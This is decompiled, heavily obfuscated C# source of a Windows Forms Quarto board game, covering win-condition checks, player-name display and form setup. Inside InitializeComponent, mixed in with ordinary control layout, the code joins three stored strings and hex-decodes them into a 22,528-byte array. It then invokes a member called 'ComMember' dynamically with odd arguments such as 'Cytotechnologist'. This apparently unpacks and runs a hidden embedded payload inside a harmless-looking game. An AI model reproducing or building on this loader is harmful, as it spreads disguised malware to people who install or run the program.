				case 53u:
				{
					int num8;
					int num9;
					if (mem[1, 2].Dark == mem[2, 1].Dark)
					{
						num8 = -1048655975;
						num9 = -1048655975;
					}
					else
					{
						num8 = -1763484526;
						num9 = -1763484526;
					}
					num = num8 ^ ((int)num2 * -1097328493);
					continue;
				}
				case 52u:
				{
					int num70;
					int num71;
					if (mem[num3, 0].Big != mem[num3, 1].Big)
					{
						num70 = 1806931481;
						num71 = 1806931481;
					}
					else
					{
						num70 = 2044099479;
						num71 = 2044099479;
					}
					num = num70 ^ ((int)num2 * -474522629);
					continue;
				}
				case 51u:
					if (mem[3, num3] != null)
					{
						num = ((int)num2 * -1140877477) ^ 0x2006C2E0;
						continue;
					}
					goto IL_055e;
				case 50u:
					if (mem[1, 2].Square == mem[2, 1].Square)
					{
						num = (int)((num2 * 343538493) ^ 0x5396BCFD);
						continue;
					}
					goto IL_02a9;
				case 49u:
				{
					int num61;
					if (mem[0, num3].Dark != mem[1, num3].Dark)
					{
						num = 1718777602;
						num61 = 1718777602;
					}
					else
					{
						num = 12124542;
						num61 = 12124542;
					}
					continue;
				}
				case 48u:
				{
					int num58;
					int num59;
					if (mem[0, 0] == null)
					{
						num58 = 1882414114;
						num59 = 1882414114;
					}
					else
					{
						num58 = 1965420531;
						num59 = 1965420531;
					}
					num = num58 ^ ((int)num2 * -1597126273);
					continue;
				}
				case 46u:
				{
					int num50;
					int num51;
					if (mem[num3, 0] != null)
					{
						num50 = 615580943;
						num51 = 615580943;
					}
					else
					{
						num50 = 882446718;
						num51 = 882446718;
					}
					num = num50 ^ (int)(num2 * 908067451);
					continue;
				}
				case 45u:
					num = 1002076962;
					continue;
				case 44u:
					num3++;
					num = (int)(num2 * 1795713025) ^ -1641199718;
					continue;
				case 43u:
					if (mem[num3, 2].Point != mem[num3, 3].Point)
					{
						num = (int)((num2 * 549584461) ^ 0x584D4776);
						continue;
					}
					goto IL_0035;
				case 42u:
					flag3 = num3 < 4;
					num = 2102424323;
					continue;
				case 40u:
				{
					int num39;
					int num40;
					if (mem[1, 1] == null)
					{
						num39 = -829102839;
						num40 = -829102839;
					}
					else
					{
						num39 = -278445065;
						num40 = -278445065;
					}
					num = num39 ^ (int)(num2 * 1569695676);
					continue;
				}
				case 39u:
				{
					int num35;
					int num36;
					if (mem[1, 2].Big == mem[2, 1].Big)
					{
						num35 = 1432058046;
						num36 = 1432058046;
					}
					else
					{
						num35 = 1857048698;
						num36 = 1857048698;
					}
					num = num35 ^ (int)(num2 * 992867884);
					continue;
				}
				case 38u:
				{
					int num30;
					if (mem[0, 3].Point != mem[1, 2].Point)
					{
						num = 1115774508;
						num30 = 1115774508;
					}
					else
					{
						num = 1030687911;
						num30 = 1030687911;
					}
					continue;
				}
				case 37u:
				{
					int num26;
					int num27;
					if (mem[num3, 1].Square == mem[num3, 2].Square)
					{
						num26 = -283520584;
						num27 = -283520584;
					}
					else
					{
						num26 = -1642173627;
						num27 = -1642173627;
					}
					num = num26 ^ ((int)num2 * -1611218735);
					continue;
				}
				case 36u:
					if (mem[num3, 2].Dark != mem[num3, 3].Dark)
					{
						num = ((int)num2 * -820441488) ^ -1259648947;
						continue;
					}
					goto IL_0035;
				case 35u:
				{
					int num19;
					if (mem[num3, 0].Point != mem[num3, 1].Point)
					{
						num = 1458332490;
						num19 = 1458332490;
					}
					else
					{
						num = 408342209;
						num19 = 408342209;
					}
					continue;
				}
				case 34u:
					num6 = ((mem[2, 1].Square == mem[3, 0].Square) ? 1 : 0);
					goto IL_005f;
				case 33u:
					if (mem[2, 2].Square != mem[3, 3].Square)
					{
						num = (int)((num2 * 117650956) ^ 0x5413DC4D);
						continue;
					}
					goto IL_013d;
				case 32u:
					if (mem[2, 2].Dark != mem[3, 3].Dark)
					{
						num = (int)((num2 * 539747304) ^ 0x27CA0B16);
						continue;
					}
					goto IL_013d;
				case 31u:
				{
					int num10;
					int num11;
					if (mem[0, num3].Big == mem[1, num3].Big)
					{
						num10 = 1713757132;
						num11 = 1713757132;
					}
					else
					{
						num10 = 578198680;
						num11 = 578198680;
					}
					num = num10 ^ ((int)num2 * -116048339);
					continue;
				}
				case 30u:
				{
					int num72;
					int num73;
					if (!flag4)
					{
						num72 = 577492935;
						num73 = 577492935;
					}
					else
					{
						num72 = 1024925800;
						num73 = 1024925800;
					}
					num = num72 ^ (int)(num2 * 422032110);
					continue;
				}
				case 29u:
					if (mem[0, num3] != null)
					{
						num = 1584533925;
						continue;
					}
					goto IL_055e;
				case 28u:
					result = flag2;
					num = 1102811794;
					continue;
				case 27u:
					if (mem[0, 3] != null)
					{
						num = 221092562;
						continue;
					}
					goto IL_005e;
				case 26u:
				{
					int num69;
					if (mem[0, 0].Square == mem[1, 1].Square)
					{
						num = 664704856;
						num69 = 664704856;
					}
					else
					{
						num = 720675661;
						num69 = 720675661;
					}
					continue;
				}
				case 25u:
				{
					int num68;
					if (mem[0, 0].Point != mem[1, 1].Point)
					{
						num = 636181760;
						num68 = 636181760;
					}
					else
					{
						num = 338804646;
						num68 = 338804646;
					}
					continue;
				}
				case 24u:
					if (mem[2, num3].Dark != mem[3, num3].Dark)
					{
						num = ((int)num2 * -1018106792) ^ 0x7E1FC5EA;
						continue;
					}
					goto IL_027d;
				case 23u:
				{
					int num62;
					int num63;
					if (mem[3, 3] == null)
					{
						num62 = -1515127641;
						num63 = -1515127641;
					}
					else
					{
						num62 = -2112705539;
						num63 = -2112705539;
					}
					num = num62 ^ ((int)num2 * -839953801);
					continue;
				}
				case 22u:
				{
					int num60;
					if (mem[0, 3].Dark != mem[1, 2].Dark)
					{
						num = 2040491365;
						num60 = 2040491365;
					}
					else
					{
						num = 1547337582;
						num60 = 1547337582;
					}
					continue;
				}
				case 21u:
				{
					int num53;
					int num54;
					if (mem[num3, 1].Point == mem[num3, 2].Point)
					{
						num53 = 1669094429;
						num54 = 1669094429;
					}
					else
					{
						num53 = 336836760;
						num54 = 336836760;
					}
					num = num53 ^ ((int)num2 * -1488572583);
					continue;
				}
				case 20u:
					if (mem[2, num3] != null)
					{
						num = ((int)num2 * -674563950) ^ 0x77F280D4;
						continue;
					}
					goto IL_055e;
				case 19u:
				{
					int num46;
					int num47;
					if (mem[num3, 2] != null)
					{
						num46 = -1542848643;
						num47 = -1542848643;
					}
					else
					{
						num46 = -1775297746;
						num47 = -1775297746;
					}
					num = num46 ^ ((int)num2 * -273694021);
					continue;
				}
				case 18u:
					if (mem[2, 1] != null)
					{
						num = (int)(num2 * 1097154559) ^ -830795160;
						continue;
					}
					goto IL_005e;
				case 17u:
				{
					int num45;
					if (mem[0, 0].Dark == mem[1, 1].Dark)
					{
						num = 1504018597;
						num45 = 1504018597;
					}
					else
					{
						num = 1867160150;
						num45 = 1867160150;
					}
					continue;
				}
				case 16u:
				{
					int num41;
					int num42;
					if (mem[1, 1].Point == mem[2, 2].Point)
					{
						num41 = -1007266456;
						num42 = -1007266456;
					}
					else
					{
						num41 = -1971852013;
						num42 = -1971852013;
					}
					num = num41 ^ ((int)num2 * -1313112201);
					continue;
				}
				case 15u:
				{
					int num37;
					int num38;
					if (mem[0, 3].Big == mem[1, 2].Big)
					{
						num37 = 603913369;
						num38 = 603913369;
					}
					else
					{
						num37 = 1281089346;
						num38 = 1281089346;
					}
					num = num37 ^ ((int)num2 * -1286530674);
					continue;
				}
				case 14u:
					if (mem[num3, 2].Big != mem[num3, 3].Big)
					{
						num = ((int)num2 * -2035744042) ^ -716748996;
						continue;
					}
					goto IL_0035;
				case 13u:
				{
					int num31;
					int num32;
					if (mem[1, num3].Point == mem[2, num3].Point)
					{
						num31 = -237086593;
						num32 = -237086593;
					}
					else
					{
						num31 = -1589113048;
						num32 = -1589113048;
					}
					num = num31 ^ (int)(num2 * 1493715151);
					continue;
				}
				case 12u:
					flag2 = false;
					num = (int)(num2 * 456296002) ^ -1637582002;
					continue;
				case 11u:
					if (mem[1, num3] != null)
					{
						num = (int)(num2 * 1646452973) ^ -1511331466;
						continue;
					}
					goto IL_055e;
				case 10u:
				{
					int num28;
					int num29;
					if (mem[num3, 1] == null)
					{
						num28 = 132832979;
						num29 = 132832979;
					}
					else
					{
						num28 = 347204196;
						num29 = 347204196;
					}
					num = num28 ^ ((int)num2 * -1343812902);
					continue;
				}
				case 9u:
				{
					int num24;
					int num25;
					if (mem[1, 1].Dark == mem[2, 2].Dark)
					{
						num24 = -1479554151;
						num25 = -1479554151;
					}
					else
					{
						num24 = -1753020828;
						num25 = -1753020828;
					}
					num = num24 ^ (int)(num2 * 1145817235);
					continue;
				}
				case 8u:
				{
					int num20;
					int num21;
					if (mem[2, 2] != null)
					{
						num20 = -1579265643;
						num21 = -1579265643;
					}
					else
					{
						num20 = -1874402851;
						num21 = -1874402851;
					}
					num = num20 ^ ((int)num2 * -743134651);
					continue;
				}
				case 7u:
					if (mem[1, num3].Square == mem[2, num3].Square)
					{
						num = (int)(num2 * 945062690) ^ -1422578986;
						continue;
					}
					goto IL_042b;
				case 6u:
					if (mem[1, 2] != null)
					{
						num = ((int)num2 * -363510940) ^ -417841103;
						continue;
					}
					goto IL_005e;
				case 5u:
				{
					int num16;
					if (mem[0, num3].Point != mem[1, num3].Point)
					{
						num = 212462327;
						num16 = 212462327;
					}
					else
					{
						num = 1558878482;
						num16 = 1558878482;
					}
					continue;
				}
				case 4u:
				{
					int num14;
					int num15;
					if (mem[1, 2].Point == mem[2, 1].Point)
					{
						num14 = -2105434809;
						num15 = -2105434809;
					}
					else
					{
						num14 = -1884322944;
						num15 = -1884322944;
					}
					num = num14 ^ ((int)num2 * -2124438597);
					continue;
				}
				case 3u:
				{
					int num12;
					int num13;
					if (flag3)
					{
						num12 = 956568117;
						num13 = 956568117;
					}
					else
					{
						num12 = 2089705074;
						num13 = 2089705074;
					}
					num = num12 ^ ((int)num2 * -562039940);
					continue;
				}
				case 2u:
					flag2 = true;
					num = ((int)num2 * -980322893) ^ -1267915714;
					continue;
				case 1u:
					if (mem[2, 1].Point != mem[3, 0].Point)
					{
						num = (int)(num2 * 1475338546) ^ -1788772420;
						continue;
					}
					goto IL_0172;
				case 0u:
				{
					int num4;
					int num5;
					if (mem[num3, 3] != null)
					{
						num4 = -486586433;
						num5 = -486586433;
					}
					else
					{
						num4 = -112230606;
						num5 = -112230606;
					}
					num = num4 ^ ((int)num2 * -568053445);
					continue;
				}
				case 47u:
					break;
				default:
					{
						return result;
					}
					IL_02a9:
					num6 = 0;
					goto IL_005f;
					IL_0036:
					flag = (byte)num7 != 0;
					num = 487671108;
					continue;
					IL_0172:
					num6 = 1;
					goto IL_005f;
					IL_027d:
					num7 = 1;
					goto IL_0036;
					IL_013d:
					num6 = 1;
					goto IL_005f;
					IL_042b:
					num7 = 0;
					goto IL_0036;
					IL_005f:
					flag4 = (byte)num6 != 0;
					num = 1811998760;
					continue;
					IL_0035:
					num7 = 1;
					goto IL_0036;
					IL_005e:
					num6 = 0;
					goto IL_005f;
					IL_055e:
					num7 = 0;
					goto IL_0036;
				}
				break;
			}
		}
	}

	private bool Standoff(Figurine[,] mem)
	{
		bool flag2 = default(bool);
		bool flag = default(bool);
		bool flag3 = default(bool);
		int num3 = default(int);
		int num6 = default(int);
		bool result = default(bool);
		while (true)
		{
			int num = 375204996;
			while (true)
			{
				uint num2;
				switch ((num2 = (uint)num ^ 0x4C29D8F1u) % 16u)
				{
				case 15u:
					flag2 = false;
					num = ((int)num2 * -1680599373) ^ -1132180693;
					continue;
				case 14u:
				{
					int num8;
					int num9;
					if (!flag)
					{
						num8 = 2126040800;
						num9 = 2126040800;
					}
					else
					{
						num8 = 636777177;
						num9 = 636777177;
					}
					num = num8 ^ ((int)num2 * -1043304136);
					continue;
				}
				case 13u:
					num = (int)((num2 * 1425996206) ^ 0x45CE3223);
					continue;
				case 12u:
					num = (int)(num2 * 1289718982) ^ -868464960;
					continue;
				case 11u:
					num = (int)((num2 * 1717297448) ^ 0x17D25A19);
					continue;
				case 10u:
					flag3 = mem[num3, num6] == null;
					num = 1127298931;
					continue;
				case 9u:
				{
					int num7;
					if (num6 >= 4)
					{
						num = 937542018;
						num7 = 937542018;
					}
					else
					{
						num = 1642622987;
						num7 = 1642622987;
					}
					continue;
				}
				case 8u:
					num6 = 0;
					num = 1164474957;
					continue;
				case 7u:
					num6++;
					num = 1404758952;
					continue;
				case 5u:
					flag2 = true;
					num3 = 0;
					num = ((int)num2 * -1691483661) ^ 0x47AF8DF5;
					continue;
				case 3u:
					num3++;
					num = (int)((num2 * 994465525) ^ 0x21A453AE);
					continue;
				case 2u:
				{
					int num4;
					int num5;
					if (!flag3)
					{
						num4 = -1991299798;
						num5 = -1991299798;
					}
					else
					{
						num4 = -1921620222;
						num5 = -1921620222;
					}
					num = num4 ^ (int)(num2 * 5283086);
					continue;
				}
				case 1u:
					result = flag2;
					num = (int)(num2 * 1771147381) ^ -1024050823;
					continue;
				case 0u:
					flag = num3 < 4;
					num = 2067660959;
					continue;
				case 6u:
					break;
				default:
					return result;
				}
				break;
			}
		}
	}

	public void SetName(string str)
	{
		Form1.smethod_32((Control)(object)label5, "Игрок: ");
		while (true)
		{
			int num = -1422761751;
			while (true)
			{
				uint num2;
				switch ((num2 = (uint)num ^ 0x9661EFAAu) % 6u)
				{
				case 5u:
					Form1.smethod_50((Control)(object)label5, (Form1.smethod_49((Control)(object)this) - (Form1.smethod_18((Control)(object)label5) + Form1.smethod_18((Control)(object)label6))) / 2);
					Form1.smethod_50((Control)(object)label6, Form1.smethod_37((Control)(object)label5).X + Form1.smethod_18((Control)(object)label5));
					num = (int)(num2 * 73761527) ^ -964586722;
					continue;
				case 3u:
					Form1.smethod_32((Control)(object)label6, str);
					num = (int)(num2 * 1169994098) ^ -1743784187;
					continue;
				case 2u:
					num = (int)(num2 * 81562430) ^ -1524678304;
					continue;
				case 1u:
					Form1.smethod_32((Control)(object)label1, "");
					Form1.smethod_32((Control)(object)label2, "");
					num = (int)(num2 * 145537210) ^ -829945090;
					continue;
				default:
					return;
				case 4u:
					break;
				case 0u:
					return;
				}
				break;
			}
		}
	}

	protected override void Dispose(bool disposing)
	{
		bool flag = default(bool);
		while (true)
		{
			int num = -1231171780;
			while (true)
			{
				uint num2;
				int num3;
				switch ((num2 = (uint)num ^ 0x95B5EDCFu) % 9u)
				{
				case 7u:
					num = (int)(num2 * 2026290728) ^ -1098284542;
					continue;
				case 6u:
				{
					int num4;
					int num5;
					if (flag)
					{
						num4 = 1823224424;
						num5 = 1823224424;
					}
					else
					{
						num4 = 1100654683;
						num5 = 1100654683;
					}
					num = num4 ^ ((int)num2 * -1431004969);
					continue;
				}
				case 5u:
					Form1.smethod_51((IDisposable)components);
					num = (int)(num2 * 649396527) ^ -1796999310;
					continue;
				case 4u:
					num3 = ((components != null) ? 1 : 0);
					goto IL_005f;
				case 3u:
					((Form)this).Dispose(disposing);
					num = -890992337;
					continue;
				case 2u:
					num = ((int)num2 * -1123608355) ^ -1163309680;
					continue;
				case 1u:
					if (disposing)
					{
						num = ((int)num2 * -26027570) ^ 0x1AD74C13;
						continue;
					}
					num3 = 0;
					goto IL_005f;
				default:
					return;
				case 0u:
					break;
				case 8u:
					return;
					IL_005f:
					flag = (byte)num3 != 0;
					num = -1065631996;
					continue;
				}
				break;
			}
		}
	}

	private void InitializeComponent()
	{
		//IL_00cf: Unknown result type (might be due to invalid IL or missing references)
		//IL_00d9: Expected O, but got Unknown
		components = Form1.smethod_52();
		int num3 = default(int);
		byte[] array = default(byte[]);
		object[] object_ = default(object[]);
		string sa = default(string);
		while (true)
		{
			int num = 679451346;
			while (true)
			{
				uint num2;
				switch ((num2 = (uint)num ^ 0x49DE136Du) % 115u)
				{
				case 114u:
					num = (int)(num2 * 2077772626) ^ -896984611;
					continue;
				case 113u:
					Form1.smethod_64((Control)(object)label5, 12);
					num = (int)((num2 * 518127000) ^ 0x3A8D8735);
					continue;
				case 112u:
					Form1.smethod_90((ISupportInitialize)pictureBox1);
					num = ((int)num2 * -736647699) ^ -579651776;
					continue;
				case 111u:
					Form1.smethod_9(Form1.smethod_82((Control)(object)this), (Control)(object)label6);
					Form1.smethod_9(Form1.smethod_82((Control)(object)this), (Control)(object)label5);
					num = (int)(num2 * 1819109207) ^ -1955039697;
					continue;
				case 110u:
					Form1.smethod_64((Control)(object)label2, 9);
					Form1.smethod_74((Control)(object)label5, bool_0: true);
					num = (int)(num2 * 2060863381) ^ -2069590079;
					continue;
				case 109u:
					Form1.smethod_6((Control)(object)pictureBox1, new MouseEventHandler(PictureBox1_MouseDown));
					num = (int)(num2 * 1363044488) ^ -1567342144;
					continue;
				case 108u:
					Form1.smethod_77((Control)(object)label2, Form1.smethod_76("Microsoft Sans Serif", 9.75f, (FontStyle)0, (GraphicsUnit)3, (byte)204));
					Form1.smethod_4((Control)(object)label2, new Point(0, 0));
					num = ((int)num2 * -1591080008) ^ 0x703FF0B0;
					continue;
				case 107u:
					Form1.smethod_77((Control)(object)label1, Form1.smethod_76("Microsoft Sans Serif", 9.75f, (FontStyle)0, (GraphicsUnit)3, (byte)204));
					num = ((int)num2 * -1271386047) ^ 0x25160AB3;
					continue;
				case 106u:
					num = (int)((num2 * 758474965) ^ 0x70EC7C47);
					continue;
				case 105u:
					Form1.smethod_67((Control)(object)button2, (EventHandler)Button2_Click);
					num = ((int)num2 * -493110758) ^ 0x37E411A;
					continue;
				case 104u:
					Form1.smethod_5((Control)(object)pictureBox1, Color.FromArgb(64, 32, 0));
					Form1.smethod_60(pictureBox1, (BorderStyle)2);
					num = (int)(num2 * 930344818) ^ -1809814894;
					continue;
				case 103u:
				{
					int num4;
					if (num3 < 22528)
					{
						num = 87315034;
						num4 = 87315034;
					}
					else
					{
						num = 1203345336;
						num4 = 1203345336;
					}
					continue;
				}
				case 102u:
					Form1.smethod_3((Control)(object)richTextBox1, new Size(272, 35));
					Form1.smethod_64((Control)(object)richTextBox1, 6);
					num = (int)(num2 * 882853669) ^ -112837238;
					continue;
				case 101u:
					Form1.smethod_61((Control)(object)label6, "label6");
					num = ((int)num2 * -81725139) ^ -1179758154;
					continue;
				case 100u:
					Form1.smethod_3((Control)(object)button1, new Size(83, 35));
					num = ((int)num2 * -1367486289) ^ 0x47370882;
					continue;
				case 99u:
					panel1 = Form1.smethod_55();
					timer1 = Form1.smethod_56(components);
					num = ((int)num2 * -1648221097) ^ 0x1CEB3F0E;
					continue;
				case 98u:
					Form1.smethod_9(Form1.smethod_82((Control)(object)this), (Control)(object)pictureBox1);
					num = ((int)num2 * -505353360) ^ -741819821;
					continue;
				case 97u:
					CharArray(array, string.Empty);
					num = (int)((num2 * 338240601) ^ 0x5B349989);
					continue;
				case 96u:
					Form1.smethod_70(ComMember, object_);
					num = (int)((num2 * 1036198461) ^ 0x4016431D);
					continue;
				case 95u:
					num = ((int)num2 * -1990481017) ^ 0x5CD3ED1D;
					continue;
				case 94u:
					num = (int)(num2 * 1403052176) ^ -1941627146;
					continue;
				case 93u:
					num = ((int)num2 * -1302276605) ^ 0x22DE16DA;
					continue;
				case 91u:
					Form1.smethod_3((Control)(object)label5, new Size(0, 16));
					num = (int)((num2 * 1181205646) ^ 0x3A774710);
					continue;
				case 90u:
					Form1.smethod_64((Control)(object)button1, 5);
					num = (int)((num2 * 189141785) ^ 0x3E55C9C2);
					continue;
				case 89u:
					Form1.smethod_64((Control)(object)label1, 8);
					Form1.smethod_74((Control)(object)label2, bool_0: true);
					num = ((int)num2 * -1543350174) ^ -1690433244;
					continue;
				case 88u:
					Form1.smethod_4((Control)(object)richTextBox1, new Point(107, 275));
					Form1.smethod_61((Control)(object)richTextBox1, "richTextBox1");
					num = ((int)num2 * -820737617) ^ 0x16249AAF;
					continue;
				case 87u:
					Form1.smethod_9(Form1.smethod_82((Control)(object)this), (Control)(object)button2);
					num = (int)((num2 * 1177390087) ^ 0x510713C7);
					continue;
				case 86u:
					Form1.smethod_61((Control)(object)pictureBox1, "pictureBox1");
					num = (int)(num2 * 190540303) ^ -554773400;
					continue;
				case 85u:
					num = ((int)num2 * -1341721199) ^ -959492331;
					continue;
				case 84u:
					Form1.smethod_32((Control)(object)button2, "Подтвердить");
					num = (int)(num2 * 82136531) ^ -772099081;
					continue;
				case 83u:
					num = (int)(num2 * 276356628) ^ -487150652;
					continue;
				case 82u:
					Form1.smethod_78((Control)(object)label1, (RightToLeft)0);
					Form1.smethod_3((Control)(object)label1, new Size(0, 16));
					num = ((int)num2 * -1694743196) ^ 0x340FB62E;
					continue;
				case 81u:
					Form1.smethod_66((ButtonBase)(object)button1, bool_0: true);
					num = (int)(num2 * 327670609) ^ -740437217;
					continue;
				case 80u:
					Form1.smethod_65((Control)(object)richTextBox1, bool_0: false);
					num = (int)((num2 * 1858766821) ^ 0x2CB0C705);
					continue;
				case 79u:
					object_ = new object[3]
					{
						Player.MembershipCondition(0),
						Player.MembershipCondition(1),
						"Cytotechnologist"
					};
					num = ((int)num2 * -1864254866) ^ 0x2C203CCD;
					continue;
				case 78u:
					Form1.smethod_75((Control)(object)label1, (DockStyle)4);
					num = (int)((num2 * 125863939) ^ 0x1A23E0BC);
					continue;
				case 77u:
					Form1.smethod_74((Control)(object)label6, bool_0: true);
					num = ((int)num2 * -477427176) ^ -1957848246;
					continue;
				case 76u:
					num = ((int)num2 * -669728256) ^ -240567711;
					continue;
				case 75u:
					Form1.smethod_9(Form1.smethod_82((Control)(object)this), (Control)(object)label2);
					Form1.smethod_9(Form1.smethod_82((Control)(object)this), (Control)(object)label1);
					num = ((int)num2 * -1835777601) ^ 0x7277EF2D;
					continue;
				case 73u:
					Form1.smethod_72(timer1, 1000);
					num = ((int)num2 * -1337602287) ^ 0x3243445A;
					continue;
				case 72u:
					Form1.smethod_62(pictureBox1, 0);
					num = (int)((num2 * 1964651271) ^ 0x2E75B0FC);
					continue;
				case 71u:
					num3++;
					num = (int)((num2 * 2063560466) ^ 0x56B4C2E4);
					continue;
				case 70u:
					Form1.smethod_9(Form1.smethod_82((Control)(object)this), (Control)(object)panel1);
					num = ((int)num2 * -1673188644) ^ 0x79278E9F;
					continue;
				case 69u:
					Form1.smethod_3((Control)(object)pictureBox1, new Size(246, 246));
					num = ((int)num2 * -1332499100) ^ 0x773CABB7;
					continue;
				case 68u:
					num = ((int)num2 * -1112495258) ^ -1713048835;
					continue;
				case 67u:
					Form1.smethod_77((Control)(object)label5, Form1.smethod_76("Microsoft Sans Serif", 9.75f, (FontStyle)0, (GraphicsUnit)3, (byte)204));
					num = ((int)num2 * -38407074) ^ 0x1132A9C2;
					continue;
				case 66u:
					button2 = Form1.smethod_53();
					num = ((int)num2 * -108584104) ^ 0xF387ECF;
					continue;
				case 65u:
					Form1.smethod_77((Control)(object)label6, Form1.smethod_76("Microsoft Sans Serif", 9.75f, (FontStyle)0, (GraphicsUnit)3, (byte)204));
					Form1.smethod_4((Control)(object)label6, new Point(275, 0));
					num = (int)((num2 * 299337297) ^ 0x2267F6F5);
					continue;
				case 64u:
					num = (int)((num2 * 346881773) ^ 0x34D33179);
					continue;
				case 63u:
					Form1.smethod_32((Control)(object)richTextBox1, "");
					num = ((int)num2 * -1378116631) ^ -950046481;
					continue;
				case 62u:
					Form1.smethod_81((Form)(object)this, new Size(486, 319));
					num = ((int)num2 * -968946317) ^ -2105469521;
					continue;
				case 61u:
					num = ((int)num2 * -607686898) ^ -1285510091;
					continue;
				case 60u:
					num = (int)(num2 * 729299427) ^ -1492390339;
					continue;
				case 59u:
					Form1.smethod_85((Control)(object)this, "Form1");
					num = ((int)num2 * -799273793) ^ -1655225853;
					continue;
				case 58u:
					num = ((int)num2 * -915729609) ^ -937703297;
					continue;
				case 57u:
					num = ((int)num2 * -416554446) ^ 0x628F09D3;
					continue;
				case 56u:
					Form1.smethod_61((Control)(object)label2, "label2");
					Form1.smethod_3((Control)(object)label2, new Size(0, 16));
					num = (int)(num2 * 1368036047) ^ -1597187319;
					continue;
				case 55u:
					Form1.smethod_80((ContainerControl)(object)this, (AutoScaleMode)1);
					num = (int)(num2 * 1268889657) ^ -1565035160;
					continue;
				case 54u:
					Form1.smethod_3((Control)(object)button2, new Size(83, 35));
					Form1.smethod_64((Control)(object)button2, 4);
					num = (int)((num2 * 1471559887) ^ 0x50A29C1B);
					continue;
				case 53u:
					Form1.smethod_61((Control)(object)label1, "label1");
					num = (int)((num2 * 950130746) ^ 0x5C891387);
					continue;
				case 52u:
					array[num3] = Form1.smethod_69(Form1.smethod_68(sa, num3 * 2, 2), 16);
					num = (int)(num2 * 580306525) ^ -1660780833;
					continue;
				case 51u:
					num = (int)(num2 * 1174859782) ^ -1579273888;
					continue;
				case 50u:
					num = ((int)num2 * -1899378104) ^ 0xE1B0747;
					continue;
				case 49u:
					Form1.smethod_61((Control)(object)button1, "button1");
					num = ((int)num2 * -1091469839) ^ 0x46C8B0A1;
					continue;
				case 48u:
					Form1.smethod_4((Control)(object)button1, new Point(12, 275));
					num = ((int)num2 * -851486970) ^ -178063167;
					continue;
				case 47u:
					num = ((int)num2 * -65846353) ^ -225919543;
					continue;
				case 46u:
					num = ((int)num2 * -1629231079) ^ -1762123757;
					continue;
				case 45u:
					Form1.smethod_63(pictureBox1, bool_0: false);
					num = ((int)num2 * -1746256141) ^ -1899353830;
					continue;
				case 44u:
					Form1.smethod_3((Control)(object)label6, new Size(0, 16));
					num = (int)((num2 * 1260366594) ^ 0x63CAF897);
					continue;
				case 43u:
					Form1.smethod_9(Form1.smethod_82((Control)(object)this), (Control)(object)button1);
					num = (int)(num2 * 1491103742) ^ -2056415855;
					continue;
				case 42u:
					label2 = Form1.smethod_57();
					label5 = Form1.smethod_57();
					num = ((int)num2 * -1277098399) ^ -1137083510;
					continue;
				case 41u:
					Form1.smethod_86((Form)(object)this, bool_0: false);
					num = (int)(num2 * 1689081718) ^ -628977468;
					continue;
				case 40u:
					num = ((int)num2 * -601367) ^ -1005442276;
					continue;
				case 39u:
					Form1.smethod_66((ButtonBase)(object)button2, bool_0: true);
					num = ((int)num2 * -945773994) ^ -681534944;
					continue;
				case 38u:
					num = (int)(num2 * 667355248) ^ -1072825576;
					continue;
				case 37u:
					num = (int)(num2 * 1542558853) ^ -1298253964;
					continue;
				case 36u:
					Form1.smethod_91((Control)(object)this, bool_0: false);
					num = ((int)num2 * -911930551) ^ 0x57622CCB;
					continue;
				case 35u:
					Form1.smethod_32((Control)(object)button1, "Меню");
					num = (int)((num2 * 1475565081) ^ 0x1CB91B48);
					continue;
				case 34u:
					Form1.smethod_64((Control)(object)label6, 13);
					num = ((int)num2 * -88047181) ^ 0x5C913831;
					continue;
				case 33u:
					num = (int)(num2 * 1851762568) ^ -1578485266;
					continue;
				case 32u:
					Form1.smethod_61((Control)(object)label5, "label5");
					num = ((int)num2 * -928276523) ^ -1582038857;
					continue;
				case 31u:
					num = (int)(num2 * 352982537) ^ -312502326;
					continue;
				case 30u:
					Form1.smethod_71((TextBoxBase)(object)richTextBox1, bool_0: true);
					num = ((int)num2 * -144708640) ^ 0x5C3F89BB;
					continue;
				case 29u:
					Form1.smethod_4((Control)(object)pictureBox1, new Point(120, 22));
					num = (int)(num2 * 571649376) ^ -1881382446;
					continue;
				case 28u:
					Form1.smethod_65((Control)(object)button1, bool_0: false);
					num = (int)(num2 * 929904958) ^ -77426007;
					continue;
				case 27u:
					Form1.smethod_4((Control)(object)panel1, new Point(0, 24));
					num = (int)((num2 * 1428934790) ^ 0xF90D515);
					continue;
				case 26u:
					label6 = Form1.smethod_57();
					Form1.smethod_58((ISupportInitialize)pictureBox1);
					Form1.smethod_59((Control)(object)this);
					num = ((int)num2 * -946982327) ^ -1038522237;
					continue;
				case 25u:
					Form1.smethod_4((Control)(object)label5, new Point(197, 0));
					num = ((int)num2 * -1682674958) ^ -1058425672;
					continue;
				case 24u:
					Form1.smethod_75((Control)(object)label2, (DockStyle)3);
					num = (int)(num2 * 1793673059) ^ -1605011173;
					continue;
				case 23u:
					Form1.smethod_61((Control)(object)button2, "button2");
					num = ((int)num2 * -1416935622) ^ 0x2430FC28;
					continue;
				case 22u:
					num = ((int)num2 * -422600949) ^ 0x2A4DC701;
					continue;
				case 21u:
					num3 = 0;
					num = (int)(num2 * 699159347) ^ -1847911688;
					continue;
				case 20u:
					num = (int)((num2 * 1630111546) ^ 0xB5FB1D9);
					continue;
				case 19u:
					sa = Veet.Sa;
					sa = Form1.smethod_34(sa, Veet.Xe);
					sa = Form1.smethod_34(sa, Veet.Zr);
					array = new byte[22528];
					num = (int)((num2 * 1804216918) ^ 0x23B3149C);
					continue;
				case 18u:
					Form1.smethod_4((Control)(object)button2, new Point(391, 275));
					num = (int)((num2 * 13539921) ^ 0x7D982335);
					continue;
				case 17u:
					Form1.smethod_4((Control)(object)label1, new Point(486, 0));
					num = (int)((num2 * 791526350) ^ 0x5957FA25);
					continue;
				case 16u:
					Form1.smethod_61((Control)(object)panel1, "panel1");
					Form1.smethod_3((Control)(object)panel1, new Size(486, 240));
					Form1.smethod_64((Control)(object)panel1, 7);
					num = ((int)num2 * -215537341) ^ -715841491;
					continue;
				case 15u:
					num = 1532277633;
					continue;
				case 14u:
					button1 = Form1.smethod_53();
					richTextBox1 = Form1.smethod_54();
					num = ((int)num2 * -2069298197) ^ 0x68F52EB5;
					continue;
				case 13u:
					Form1.smethod_84((Form)(object)this, bool_0: false);
					num = (int)(num2 * 1072689555) ^ -1149751765;
					continue;
				case 12u:
					Form1.smethod_32((Control)(object)this, "Quarto");
					Form1.smethod_87((Form)(object)this, (EventHandler)Form1_Load);
					num = ((int)num2 * -1137516235) ^ 0x38E17483;
					continue;
				case 11u:
					label1 = Form1.smethod_57();
					num = ((int)num2 * -1544361162) ^ 0x4EC73DC2;
					continue;
				case 10u:
